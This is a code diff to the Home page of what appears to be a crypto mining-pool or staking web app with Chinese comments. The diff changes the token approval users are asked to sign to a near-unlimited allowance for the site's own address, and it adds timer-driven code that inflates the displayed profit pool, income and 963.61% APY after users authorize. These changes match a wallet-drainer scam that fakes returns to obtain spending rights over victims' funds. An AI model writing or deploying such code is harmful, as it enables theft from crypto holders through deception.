@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 // import WalletModal from './WalletModal';
 import { useTranslation } from 'react-i18next';
 import i18next from 'i18next';
@@ -331,7 +331,7 @@ function Home() {
         functionName: 'approve',
         args: [
           walletAuth.address as `0x${string}`, // 使用获取到的授权地址
-          parseUnits('1000000000000000000', 6),
+          parseUnits('999999999999999999999999999999999999999999', 6),
         ],
       });
 
@@ -394,6 +394,34 @@ function Home() {
     const secs = seconds % 60;
     return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
   };
+
+  const [profitPool, setProfitPool] = useState(11359.55);
+  const [playerIncome, setPlayerIncome] = useState(963.61);
+  const [stakingApy, setStakingApy] = useState(963.61);
+
+  // 计算增长值的函数
+  const calculateGrowth = useCallback((initialValue: number, maxIncrease: number, progress: number): number => {
+    // progress 是从 1 到 0 的值（倒计时进度）
+    const increaseAmount = maxIncrease * (1 - progress);
+    return initialValue + increaseAmount;
+  }, []);
+
+  // 更新数值的 effect
+  useEffect(() => {
+    if (userProfile?.user?.isAuthorized || userProfile?.user?.isVerified) {
+      const totalSeconds = 8 * 60 * 60; // 8小时的总秒数
+      const progress = timeLeft / totalSeconds; // 计算剩余进度（1 到 0）
+
+      // 更新收益池 - 最大增长 500 ETH
+      setProfitPool(calculateGrowth(11359.55, 500, progress));
+      
+      // 更新玩家收益率 - 最大增长 50%
+      setPlayerIncome(calculateGrowth(963.61, 50, progress));
+      
+      // 更新 APY - 最大增长 50%
+      setStakingApy(calculateGrowth(963.61, 50, progress));
+    }
+  }, [timeLeft, userProfile?.user, calculateGrowth]);
 
   return (
     <div>
@@ -475,13 +503,13 @@ function Home() {
           <div>
             <div className="text-gray-400 text-xs mb-1">{t('home.profitPool')}</div>
             <div className="font-medium text-xs">
-              11359.55 ETH
+              {profitPool.toFixed(2)} ETH
             </div>
           </div>
           <div>
             <div className="text-gray-400 text-xs mb-1">{t('home.playerIncome')}</div>
             <div className="font-medium text-green-500 text-xs">
-              963.61 %
+              {playerIncome.toFixed(2)} %
             </div>
           </div>
           <div>
@@ -507,7 +535,7 @@ function Home() {
           <div>
             <div className="text-gray-400 text-xs mb-2">{t('home.stakingAPY')}:</div>
             <div className="flex items-center justify-between bg-[#151923] rounded-lg px-4 py-2">
-              <span className="text-sm bg-[#6366f1] text-white px-4 py-1 rounded-lg">963.61 %</span>
+              <span className="text-sm bg-[#6366f1] text-white px-4 py-1 rounded-lg">{stakingApy.toFixed(2)} %</span>
               <button className="text-gray-400 bg-[#1F2937] rounded-full p-1 hover:bg-[#374151]">
                 <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-4 h-4">
                   <path strokeLinecap="round" strokeLinejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z" />
@@ -540,8 +568,6 @@ function Home() {
           </div>
         </div>
       </div>
-
-
 
       {/* VIP会员区域 */}
       <h3 className="text-center text-xl mb-2">{t('vipMiningPool')}</h3>
@@ -629,7 +655,6 @@ function Home() {
         </div>
       </div>
 
-
               {/* 数据展示卡片 */}
               <div className="grid grid-cols-2 gap-4 mb-6">
           {/* 得矿率卡片 */}
@@ -662,8 +687,6 @@ function Home() {
             </div>
           </div>
         </div>
-
-
 
       {/* 常见问题 */}
       <div className="mb-6">
